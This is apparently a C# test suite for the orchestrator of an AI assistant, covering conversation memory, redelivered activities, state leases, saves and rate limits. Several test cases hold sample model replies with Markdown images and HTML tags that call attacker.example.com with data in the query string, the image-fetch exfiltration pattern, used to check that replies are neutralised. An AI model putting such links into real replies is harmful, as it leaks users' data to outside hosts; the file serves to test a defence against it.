using System.Net;
using System.Text.Json.Nodes;
using Margo.Cloud.Engine;
using Margo.Cloud.State.Core;
using Microsoft.Extensions.Logging;

namespace Margo.Cloud.Orchestrator.Tests;

/// <summary>
/// What the port does beyond <c>orchestrator.py</c> (PORTING.md, deviations 12 to 18): the conversation carried in
/// memory and advanced only after the save, a failed turn that does not break the chat, redelivered activities,
/// turns of one account one after another, a busy lease told apart from unsafe state, intake that is retried, state
/// initialised again after the local copy was replaced, and replies that load nothing by themselves.
/// </summary>
public sealed class OrchestratorHardeningTests
{
    private readonly InMemoryLeaseStore _inner = new();
    private readonly List<StateReceipt> _receipts = [];
    private TestStore _store = null!;
    private FakeModel _model = new();
    private CapturingLogger _logger = new();

    private static CancellationToken Cancel => TestContext.Current.CancellationToken;

    private Orchestrator Create(TempState state, object?[] script, OrchestratorOptions? options = null, IModelClient? model = null,
                                bool exclusiveNoWait = false)
    {
        _model = new FakeModel(script);
        _logger = new CapturingLogger();
        _store = new TestStore(_inner, exclusiveNoWait);
        var engine = new Margo.Cloud.Engine.Engine(model ?? _model, "fictional-model", Fixtures.Root);
        options = (options ?? new OrchestratorOptions { IntakeRetryDelays = [] }) with
        {
            Backchannel = false, // BackchannelTests cover observation runs
            StateCliCommand = StateCli.Command,
            Logger = _logger,
            StateRecorder = receipt =>
            {
                lock (_receipts)
                {
                    _receipts.Add(receipt);
                }
            },
        };
        return new Orchestrator(engine, new DirectoryTransport(), state.Path, _ => _store, options);
    }

    private static InboundEvent Event(string activity, string text = "Brief me", string sender = "principal-1", string conversation = "conv-manager",
                                      string name = "Dana") => new()
    {
        AgentIdentityId = "agent-identity-1",
        AgentUserId = "margo-user-1",
        SenderId = sender,
        SenderName = name,
        ConversationId = conversation,
        ConversationType = "personal",
        ActivityId = activity,
        Channel = "teams",
        Text = text,
    };

    private static Task<TurnReply> Handle(Orchestrator orchestrator, InboundEvent inbound) =>
        orchestrator.HandleAsync(inbound, kind => Task.FromResult<string?>(kind + "-token"), Cancel);

    /// <summary>The manager's messages in a request, without their time lines.</summary>
    private static List<string> Messages(JsonObject request) =>
        ((JsonArray)request["input"]!).Where(item => PyNode.Is(item!["role"], "user"))
            .Select(item => PyNode.AsString(item!["content"])!).Select(content => content[(content.IndexOf("\n\n", StringComparison.Ordinal) + 2)..]).ToList();

    // -- A: nothing stored, the conversation in memory ------------------------------------------------

    [Fact]
    public async Task The_conversation_is_carried_in_memory_and_nothing_is_stored_by_the_service()
    {
        using var state = new TempState();
        var orchestrator = Create(state, [FakeModel.Final("First.", "r-1"), FakeModel.Final("Second.", "r-2"), FakeModel.Final("Elsewhere.", "r-3")]);
        await Handle(orchestrator, Event("a-1", "one"));
        await Handle(orchestrator, Event("a-2", "two"));
        await Handle(orchestrator, Event("a-3", "three", conversation: "conv-other"));
        Assert.All(_model.Requests, request => Assert.Equal("false", request["store"]!.ToJsonString()));
        Assert.All(_model.Requests, request => Assert.False(request.ContainsKey("previous_response_id")));
        Assert.Equal([["one"], ["one", "two"], ["three"]], _model.Requests.Select(Messages));
        // The second request repeats the first turn exactly (its message and the answer), then adds the new message.
        var second = (JsonArray)_model.Requests[1]["input"]!;
        Assert.Equal(PyJson.Dumps(_model.Requests[0]["input"]![0]), PyJson.Dumps(second[0]));
        Assert.Equal("First.", PyNode.AsString(second[1]!["content"]![0]!["text"]));
        // One cache key for the instance and manager: a hash, not a name.
        var key = PyIds.Sha256Hex(Fixtures.Binding.Account)[..32];
        Assert.All(_model.Requests, request => Assert.Equal(key, PyNode.AsString(request["prompt_cache_key"])));
        Assert.Equal(2, orchestrator.Conversations.Count);
    }

    [Fact]
    public async Task A_failed_turn_does_not_break_the_conversation()
    {
        using var state = new TempState();
        var orchestrator = Create(state, [FakeModel.Final("First."), new InvalidOperationException("model throttled"), FakeModel.Final("Third.")]);
        Assert.Equal("answered", (await Handle(orchestrator, Event("a-1", "one"))).Status);
        Assert.Equal(new TurnReply(Orchestrator.TurnFailed, "error"), await Handle(orchestrator, Event("a-2", "two")));
        // The next message works, from the conversation as it stood before the failed turn.
        Assert.Equal(new TurnReply("Third.", "answered"), await Handle(orchestrator, Event("a-3", "three")));
        Assert.Equal(["one", "three"], Messages(_model.Requests[2]));
    }

    [Fact]
    public async Task A_request_the_service_refuses_drops_the_conversation_it_carried()
    {
        using var state = new TempState();
        var orchestrator = Create(state, [
            FakeModel.Final("First."), new ModelApiException("Error code: 400 (type=invalid_request_error)", HttpStatusCode.BadRequest),
            FakeModel.Final("Fresh."), new ModelApiException("Error code: 429", HttpStatusCode.TooManyRequests), FakeModel.Final("Kept."),
        ]);
        await Handle(orchestrator, Event("a-1", "one"));
        Assert.Equal("error", (await Handle(orchestrator, Event("a-2", "two"))).Status);
        Assert.Equal(new TurnReply("Fresh.", "answered"), await Handle(orchestrator, Event("a-3", "three")));
        Assert.Equal(["three"], Messages(_model.Requests[2])); // not the history the service refused
        // Throttling says nothing about the conversation: it is kept.
        Assert.Equal("error", (await Handle(orchestrator, Event("a-4", "four"))).Status);
        await Handle(orchestrator, Event("a-5", "five"));
        Assert.Equal(["three", "five"], Messages(_model.Requests[4]));
    }

    [Fact]
    public async Task The_conversation_advances_only_after_the_state_was_saved()
    {
        using var state = new TempState();
        // The second turn changes the state (a setting written to preferences by the script), and its save fails.
        var orchestrator = Create(state, [
            FakeModel.Final("First."),
            FakeModel.Response("r2", FakeModel.Call("margo-state", """{"script": "work_state.py", "args": ["init"]}""")),
            FakeModel.Final("I wrote that down."),
            FakeModel.Final("Third."),
        ]);
        await Handle(orchestrator, Event("a-1", "one"));
        _store.FailWrites = true;
        File.AppendAllText(orchestrator.Paths(Fixtures.Binding.Account).Preferences, "- **Replies to other people:** none\n"); // a change to save
        // The turn ran, so the manager is not told "nothing was sent", and the same activity delivered again does not run again.
        Assert.Equal(new TurnReply(Orchestrator.StateNotSaved, "state_unsafe"), await Handle(orchestrator, Event("a-2", "write it down")));
        Assert.DoesNotContain("Nothing was sent", Orchestrator.StateNotSaved, StringComparison.Ordinal);
        var requests = _model.Requests.Count;
        await Handle(orchestrator, Event("a-2", "write it down"));
        Assert.Equal(requests, _model.Requests.Count);
        _store.FailWrites = false;
        Assert.Equal("answered", (await Handle(orchestrator, Event("a-3", "three"))).Status);
        // The model is not told it "wrote that down": that turn's state was never saved, so the turn is not remembered.
        Assert.Equal(["one", "three"], Messages(_model.Requests[^1]));
        Assert.DoesNotContain("I wrote that down.", PyJson.Dumps(_model.Requests[^1]["input"]), StringComparison.Ordinal);
    }

    [Fact]
    public async Task An_idle_conversation_is_forgotten()
    {
        using var state = new TempState();
        var clock = new ManualClock();
        var orchestrator = Create(state, [FakeModel.Final("First."), FakeModel.Final("Second."), FakeModel.Final("Third.")],
                                  new OrchestratorOptions { Clock = clock, IntakeRetryDelays = [] });
        await Handle(orchestrator, Event("a-1", "one"));
        clock.Advance(TimeSpan.FromMinutes(29));
        await Handle(orchestrator, Event("a-2", "two"));
        clock.Advance(TimeSpan.FromMinutes(31));
        Assert.Equal(0, orchestrator.Conversations.Count);
        await Handle(orchestrator, Event("a-3", "three"));
        Assert.Equal([["one"], ["one", "two"], ["three"]], _model.Requests.Select(Messages));
    }

    [Fact]
    public void Conversations_kept_are_bounded_and_copied()
    {
        var clock = new ManualClock();
        var store = new ConversationStore(TimeSpan.FromMinutes(30), capacity: 2, clock);
        JsonArray Items(string text) => [new JsonObject { ["role"] = "user", ["content"] = text }];
        store.Set("a", Items("a"));
        clock.Advance(TimeSpan.FromMinutes(1));
        store.Set("b", Items("b"));
        clock.Advance(TimeSpan.FromMinutes(1));
        store.Set("c", Items("c")); // the least recently used goes
        Assert.Null(store.Get("a"));
        Assert.Equal(2, store.Count);
        var kept = store.Get("b")!;
        kept.Add(new JsonObject()); // a copy: the stored conversation is not changed by its reader
        Assert.Single(store.Get("b")!);
        store.Set("b", []);
        Assert.Null(store.Get("b"));
        clock.Advance(TimeSpan.FromMinutes(30));
        Assert.Null(store.Get("c"));
    }

    [Fact]
    public async Task Each_model_turn_logs_its_token_counts_and_no_content()
    {
        using var state = new TempState();
        var final = FakeModel.Final("A fictional answer about the Contoso offer.");
        final["usage"] = PyJson.Loads("""{"input_tokens": 1200, "input_tokens_details": {"cached_tokens": 1000}, "output_tokens": 80, "output_tokens_details": {"reasoning_tokens": 30}}""");
        var orchestrator = Create(state, [FakeModel.Response("r1", FakeModel.Call("load_skill", """{"name": "decision-log"}""")), final]);
        await Handle(orchestrator, Event("a-1", "What about the Contoso offer?"));
        var entry = Assert.Single(_logger.Entries);
        Assert.Equal(LogLevel.Information, entry.Level);
        Assert.Equal("turn usage input=1200 cached=1000 output=80 reasoning=30 rounds=1 tool_calls=1 requests=2 history_turns=1", entry.Message);
    }

    // -- C: reliability ----------------------------------------------------------------------------------

    [Fact]
    public async Task A_redelivered_manager_activity_does_not_run_again()
    {
        using var state = new TempState();
        var orchestrator = Create(state, [FakeModel.Final("Once."), FakeModel.Final("Another message.")]);
        Assert.Equal(new TurnReply("Once.", "answered"), await Handle(orchestrator, Event("a-1")));
        Assert.Equal(new TurnReply(null, "duplicate"), await Handle(orchestrator, Event("a-1")));
        Assert.Single(_model.Requests); // the engine (and its state commands) ran once
        Assert.Equal("answered", (await Handle(orchestrator, Event("a-2"))).Status);
        Assert.Contains(_logger.Entries, entry => entry.Message == "duplicate manager activity dropped");
    }

    [Fact]
    public async Task A_redelivery_while_the_first_is_still_running_is_dropped_at_once()
    {
        using var state = new TempState();
        var model = new HeldModel(FakeModel.Final("Once."));
        var orchestrator = Create(state, [], model: model);
        var first = Handle(orchestrator, Event("a-1"));
        await model.Started.Task.WaitAsync(Cancel);
        Assert.Equal(new TurnReply(null, "duplicate"), await Handle(orchestrator, Event("a-1")));
        model.Release.SetResult();
        Assert.Equal("answered", (await first).Status);
        Assert.Equal(1, model.Calls);
    }

    [Fact]
    public async Task A_failed_turn_may_be_redelivered()
    {
        using var state = new TempState();
        var orchestrator = Create(state, [new InvalidOperationException("model down"), FakeModel.Final("Now it works.")]);
        Assert.Equal("error", (await Handle(orchestrator, Event("a-1"))).Status);
        Assert.Equal(new TurnReply("Now it works.", "answered"), await Handle(orchestrator, Event("a-1")));
    }

    [Fact]
    public void Recent_activities_are_bounded_per_account()
    {
        var recent = new RecentActivities(2);
        Assert.True(recent.TryClaim("account-a", "1"));
        Assert.False(recent.TryClaim("account-a", "1"));
        Assert.True(recent.TryClaim("account-b", "1")); // per account
        Assert.True(recent.TryClaim("account-a", "2"));
        Assert.True(recent.TryClaim("account-a", "3")); // "1" is forgotten: only the newest two are kept
        Assert.True(recent.TryClaim("account-a", "1"));
        recent.Release("account-a", "1");
        Assert.True(recent.TryClaim("account-a", "1"));
        Assert.False(recent.TryClaim("account-a", "3"));
    }

    [Fact]
    public async Task A_second_activity_waits_for_the_first_instead_of_failing_on_the_lease()
    {
        using var state = new TempState();
        // This store refuses a lease that is held (as the Azure store does once its wait is over), so only the
        // orchestrator's own gate can make the second activity wait.
        var model = new HeldModel(FakeModel.Final("First."), FakeModel.Final("Second."));
        var orchestrator = Create(state, [], model: model, exclusiveNoWait: true);
        var first = Handle(orchestrator, Event("a-1", "one"));
        await model.Started.Task.WaitAsync(Cancel);
        var second = Handle(orchestrator, Event("a-2", "two"));
        var colleague = Handle(orchestrator, Event("c-1", "Can Dana call me?", sender: "colleague-1", conversation: "conv-rafa", name: "Rafa"));
        await Task.Delay(150, Cancel);
        Assert.False(second.IsCompleted);
        Assert.False(colleague.IsCompleted);
        model.Release.SetResult();
        Assert.Equal(new TurnReply("First.", "answered"), await first);
        Assert.Equal(new TurnReply("Second.", "answered"), await second);
        Assert.Equal(new TurnReply(null, "queued"), await colleague); // not lost
        Assert.Equal(0, _store.Refused);
    }

    [Fact]
    public async Task Someone_elses_message_is_tried_again_before_it_is_given_up()
    {
        using var state = new TempState();
        var options = new OrchestratorOptions { IntakeRetryDelays = [TimeSpan.FromMilliseconds(1), TimeSpan.FromMilliseconds(1)] };
        var orchestrator = Create(state, [], options);
        _store.FailAcquires = 2;
        var colleague = Event("c-1", "Can Dana call me?", sender: "colleague-1", conversation: "conv-rafa", name: "Rafa");
        Assert.Equal(new TurnReply(null, "queued"), await Handle(orchestrator, colleague));
        Assert.Equal(3, _store.Acquires);

        // Given up after the last attempt: reported and logged (without the message), never silently dropped.
        _store.FailAcquires = 3;
        var later = Event("c-2", "A fictional question", sender: "colleague-1", conversation: "conv-rafa", name: "Rafa");
        Assert.Equal(new TurnReply(null, "busy"), await Handle(orchestrator, later));
        Assert.Equal(6, _store.Acquires);
        var entry = Assert.Single(_logger.Entries);
        Assert.Equal((LogLevel.Error, "a message from someone else was not queued: busy"), (entry.Level, entry.Message));

        // A manager turn is not repeated here: one attempt, and an accurate notice.
        _store.FailAcquires = 1;
        Assert.Equal(new TurnReply(Orchestrator.StateBusy, "busy"), await Handle(orchestrator, Event("a-1")));
        Assert.Equal(7, _store.Acquires);
        Assert.DoesNotContain("couldn't load my records", Orchestrator.StateBusy, StringComparison.Ordinal);
    }

    [Fact]
    public async Task State_that_is_really_unsafe_is_still_reported_as_unsafe()
    {
        using var state = new TempState();
        var orchestrator = Create(state, [FakeModel.Final("never")]);
        _inner.Set(StateSync.Bundle, [1, 2, 3], "etag-tampered"); // not a bundle
        Assert.Equal(new TurnReply(Orchestrator.StateUnsafe, "state_unsafe"), await Handle(orchestrator, Event("a-1")));
        Assert.Equal(new TurnReply(null, "state_unsafe"),
                     await Handle(orchestrator, Event("c-1", sender: "colleague-1", conversation: "conv-rafa", name: "Rafa")));
        Assert.Empty(_model.Requests);
    }

    [Fact]
    public async Task State_is_initialised_again_after_the_local_copy_was_discarded_or_replaced()
    {
        using var state = new TempState();
        var orchestrator = Create(state, [FakeModel.Final("One."), FakeModel.Final("Two."), FakeModel.Final("Three."), FakeModel.Final("Four."), FakeModel.Final("Five.")]);
        List<string> Inits()
        {
            lock (_receipts)
            {
                return [.. _receipts.Where(receipt => receipt.Mode == "host").Select(receipt => receipt.Script + " " + receipt.Command)];
            }
        }

        await Handle(orchestrator, Event("a-1"));
        await Handle(orchestrator, Event("a-2"));
        Assert.Equal(2, Inits().Count); // once while the local copy stands

        // An operator removed the shared state: the local copy is discarded, so its schemas are gone too.
        Assert.True(_inner.Remove(StateSync.Bundle));
        Assert.Equal("answered", (await Handle(orchestrator, Event("a-3"))).Status);
        Assert.Equal(["memory_state.py init", "task_state.py init", "memory_state.py init", "task_state.py init"], Inits());

        // A failed save: the next turn installs the shared copy again and initialises it.
        _store.FailWrites = true;
        File.AppendAllText(orchestrator.Paths(Fixtures.Binding.Account).Preferences, "- **Replies to other people:** none\n");
        Assert.Equal("state_unsafe", (await Handle(orchestrator, Event("a-4"))).Status);
        _store.FailWrites = false;
        Assert.Equal("answered", (await Handle(orchestrator, Event("a-5"))).Status);
        Assert.Equal(6, Inits().Count);
    }

    // -- E: what a turn costs when nothing changed -----------------------------------------------------

    [Fact]
    public async Task A_manager_turn_that_changes_no_state_uploads_nothing()
    {
        using var state = new TempState();
        var orchestrator = Create(state, [
            FakeModel.Final("One."),
            FakeModel.Response("r2", FakeModel.Call("margo-state", """{"script": "work_state.py", "args": ["list"]}""")), FakeModel.Final("Two."),
            FakeModel.Final("Three."),
        ]);
        await Handle(orchestrator, Event("a-1"));
        Assert.Equal(1, _inner.Writes);
        // Opening the ledger, reading it and answering change nothing: no upload, and one daily copy.
        Assert.Equal("answered", (await Handle(orchestrator, Event("a-2"))).Status);
        Assert.Equal("answered", (await Handle(orchestrator, Event("a-3"))).Status);
        Assert.Equal(1, _inner.Writes);
        Assert.Single(_inner.Puts);
        // Someone else's message is a change.
        await Handle(orchestrator, Event("c-1", "Can Dana call me?", sender: "colleague-1", conversation: "conv-rafa", name: "Rafa"));
        Assert.Equal(2, _inner.Writes);
    }

    // -- D: what leaves, and what is queued ---------------------------------------------------------------

    [Fact]
    public async Task A_reply_cannot_make_the_client_fetch_an_image()
    {
        using var state = new TempState();
        var orchestrator = Create(state, [FakeModel.Final(
            "Here is your brief ![status](https://attacker.example.com/pixel.png?d=fictional-secret) and the [deck](https://contoso.example.com/deck).")]);
        var reply = (await Handle(orchestrator, Event("a-1"))).Reply!;
        Assert.Equal("Here is your brief status and the [deck](https://contoso.example.com/deck).", reply);
        Assert.DoesNotContain("attacker.example.com", reply, StringComparison.Ordinal);
    }

    [Theory]
    [InlineData("![x](https://attacker.example.com/?d=1)", "x")]
    [InlineData("![](https://attacker.example.com/?d=1)", "(image removed)")]
    [InlineData("a ![alt text](<https://attacker.example.com/a b> \"title\") b", "a alt text b")]
    [InlineData("![x] (https://attacker.example.com/a(b)c)", "x")]
    [InlineData("![x][ref]\n\n[ref]: https://attacker.example.com/p.png", "x\n\n[ref]: https://attacker.example.com/p.png")]
    [InlineData("[![badge](https://attacker.example.com/b.svg)](https://example.com/page)", "[badge](https://example.com/page)")]
    [InlineData("![a![b](https://attacker.example.com/1)](https://attacker.example.com/2)", "ab")]
    [InlineData("<img src=\"https://attacker.example.com/?d=1\" alt=\"chart\">", "chart")]
    [InlineData("![a[b]c](https://attacker.example.com/?d=1)", "!\\[a[b]c](https://attacker.example.com/?d=1)")]
    [InlineData("![[]](https://attacker.example.com/?d=1)", "!\\[[]](https://attacker.example.com/?d=1)")]
    [InlineData("![a\\[b](https://attacker.example.com/?d=1)", "!\\[a\\[b](https://attacker.example.com/?d=1)")]
    [InlineData("<IMG SRC=https://attacker.example.com/x.png>", "(image removed)")]
    [InlineData("x < img src='https://attacker.example.com/a' alt='q'/> y", "x q y")]
    [InlineData("<img src=\"https://attacker.example.com/unclosed", "(image removed)")]
    [InlineData("<iframe src=\"https://attacker.example.com\"></iframe>", "&lt;iframe src=\"https://attacker.example.com\">&lt;/iframe>")]
    [InlineData("<video poster='https://attacker.example.com/p'>", "&lt;video poster='https://attacker.example.com/p'>")]
    public void Images_and_self_loading_html_become_plain_text(string reply, string expected)
    {
        var safe = ReplyText.Neutralise(reply);
        Assert.Equal(expected, safe);
        Assert.DoesNotContain("![", safe, StringComparison.Ordinal);
        Assert.DoesNotMatch("(?i)<\\s*(img|iframe|video)", safe);
    }

    [Theory]
    [InlineData("Plain text with 3 < 4 and an exclamation! [link](https://contoso.example.com/a?b=c)")]
    [InlineData("Wow![1] is a footnote-like use; `code <b>` and **bold** stay.")]
    [InlineData("")]
    public void Ordinary_markdown_and_links_are_kept(string reply)
    {
        var expected = reply.Replace("![1]", "1", StringComparison.Ordinal); // a bare ![text] is an image reference in Markdown
        Assert.Equal(expected, ReplyText.Neutralise(reply));
    }

    [Fact]
    public async Task A_flood_from_one_sender_is_counted_not_queued()
    {
        using var state = new TempState();
        var orchestrator = Create(state, [FakeModel.Response("r1", FakeModel.Call("office_requests", "{}")), FakeModel.Final("Listed.")],
                                  new OrchestratorOptions { SenderDailyLimit = 3, IntakeRetryDelays = [] });
        var statuses = new List<string>();
        for (var i = 0; i < 6; i++)
        {
            statuses.Add((await Handle(orchestrator, Event("c-" + i, "Junk " + i, sender: "colleague-1", conversation: "conv-rafa", name: "Rafa"))).Status);
        }

        Assert.Equal(["queued", "queued", "queued", "rate_limited", "rate_limited", "rate_limited"], statuses);
        // A redelivery of a queued message is still the same message, not a new one against the limit.
        Assert.Equal("queued", (await Handle(orchestrator, Event("c-0", "Junk 0", sender: "colleague-1", conversation: "conv-rafa", name: "Rafa"))).Status);
        // Someone else is not affected.
        Assert.Equal("queued", (await Handle(orchestrator, Event("d-1", "A real question", sender: "colleague-2", conversation: "conv-ines", name: "Ines"))).Status);
        await Handle(orchestrator, Event("a-1", "Anything from other people?"));
        var output = FakeModel.Output(_model.Requests[1]);
        Assert.Equal(("4", "4", "2"), (output["total"]!.ToJsonString(), output["shown"]!.ToJsonString(), output["senders"]!.ToJsonString()));
        var notQueued = Assert.Single((JsonArray)output["not_queued_today"]!)!;
        Assert.Equal(("Rafa", "3"), (PyNode.AsString(notQueued["from"]), notQueued["messages"]!.ToJsonString()));
        Assert.Equal(EngineTools.UntrustedData, PyNode.AsString(output[EngineTools.TrustKey]));
    }

    private sealed class ManualClock : TimeProvider
    {
        private DateTimeOffset _now = new(2026, 10, 17, 8, 0, 0, TimeSpan.Zero);

        public override DateTimeOffset GetUtcNow() => _now;

        public void Advance(TimeSpan by) => _now += by;
    }

    /// <summary>A model whose first call waits until released, so a turn can be held in flight.</summary>
    private sealed class HeldModel(params JsonObject[] script) : IModelClient
    {
        private readonly Queue<JsonObject> _script = new(script);
        private int _calls;

        public TaskCompletionSource Started { get; } = new(TaskCreationOptions.RunContinuationsAsynchronously);

        public TaskCompletionSource Release { get; } = new(TaskCreationOptions.RunContinuationsAsynchronously);

        public int Calls => Volatile.Read(ref _calls);

        public async Task<JsonNode?> CreateResponseAsync(JsonObject request, CancellationToken cancellationToken = default)
        {
            Interlocked.Increment(ref _calls);
            Started.TrySetResult();
            await Release.Task.WaitAsync(cancellationToken).ConfigureAwait(false);
            lock (_script)
            {
                return PyNode.Copy(_script.Dequeue());
            }
        }
    }
}

/// <summary>
/// The in-memory store with faults: acquires that fail (the lease held elsewhere or storage away), writes that fail
/// (the upload lost), and, when <paramref name="exclusiveNoWait"/>, a lease that is refused while held instead of waited for.
/// </summary>
internal sealed class TestStore(InMemoryLeaseStore inner, bool exclusiveNoWait = false) : ILeaseStore
{
    private int _held;
    private int _acquires;
    private int _refused;
    private int _failAcquires;

    public int FailAcquires
    {
        get => Volatile.Read(ref _failAcquires);
        set => Volatile.Write(ref _failAcquires, value);
    }

    public bool FailWrites { get; set; }

    /// <summary>When set, this many more writes succeed and every later one fails.</summary>
    public int? WritesLeft { get; set; }

    private bool TakeWrite()
    {
        lock (this)
        {
            if (FailWrites || WritesLeft is <= 0)
            {
                return false;
            }

            WritesLeft -= 1;
            return true;
        }
    }

    public int Acquires => Volatile.Read(ref _acquires);

    public int Refused => Volatile.Read(ref _refused);

    public async Task<IStateLease> AcquireAsync(string name, CancellationToken cancellationToken = default)
    {
        Interlocked.Increment(ref _acquires);
        if (Interlocked.Decrement(ref _failAcquires) >= 0)
        {
            throw new SyncException("instance state is busy or unavailable");
        }

        Volatile.Write(ref _failAcquires, 0);
        if (exclusiveNoWait && Interlocked.CompareExchange(ref _held, 1, 0) != 0)
        {
            Interlocked.Increment(ref _refused);
            throw new SyncException("instance state is busy or unavailable");
        }

        return new Lease(this, await inner.AcquireAsync(name, cancellationToken));
    }

    public Task PutAsync(string name, byte[] data, CancellationToken cancellationToken = default) => inner.PutAsync(name, data, cancellationToken);

    private sealed class Lease(TestStore store, IStateLease lease) : IStateLease
    {
        public Task<(byte[]? Data, string? ETag)> ReadAsync(CancellationToken cancellationToken = default) => lease.ReadAsync(cancellationToken);

        public Task<(byte[]? Data, string? ETag, bool Unchanged)> ReadIfChangedAsync(string? knownETag, CancellationToken cancellationToken = default) =>
            lease.ReadIfChangedAsync(knownETag, cancellationToken);

        public Task<string?> WriteAsync(byte[] data, CancellationToken cancellationToken = default) =>
            !store.TakeWrite() ? Task.FromException<string?>(new SyncException("could not save instance state; the lease may have been lost"))
                : lease.WriteAsync(data, cancellationToken);

        public Task RenewAsync(CancellationToken cancellationToken = default) => lease.RenewAsync(cancellationToken);

        public ValueTask DisposeAsync()
        {
            Volatile.Write(ref store._held, 0);
            return lease.DisposeAsync();
        }
    }
}
